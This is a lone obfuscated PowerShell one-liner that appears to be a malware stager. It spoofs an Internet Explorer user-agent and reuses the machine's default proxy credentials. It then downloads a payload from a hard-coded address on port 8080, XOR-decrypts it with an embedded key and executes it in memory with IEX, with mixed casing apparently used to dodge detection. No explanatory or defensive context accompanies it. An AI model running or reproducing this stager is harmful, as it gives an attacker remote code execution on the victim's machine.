
$wc=New-ObjEct SyStem.NeT.WeBCLIENt;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$Wc.HeadeRs.ADD('User-Agent',$u);$Wc.Proxy = [SYSTem.NEt.WeBREqueST]::DEFAuLtWEBPrOxy;$WC.PROxy.CredENTiALs = [SYStEm.NeT.CRedEntiaLCaCHE]::DeFaulTNEtWORkCrEDENTiaLs;$K='d0fb963ff976f9c37fc81fe03c21ea7b';$I=0;[Char[]]$B=([CHAR[]]($Wc.DOWnLOAdSTrinG("http://192.168.1.120:8080/index.asp")))|%{$_-bXor$K[$I++%$K.LEnGth]};IEX ($b-jOin'')

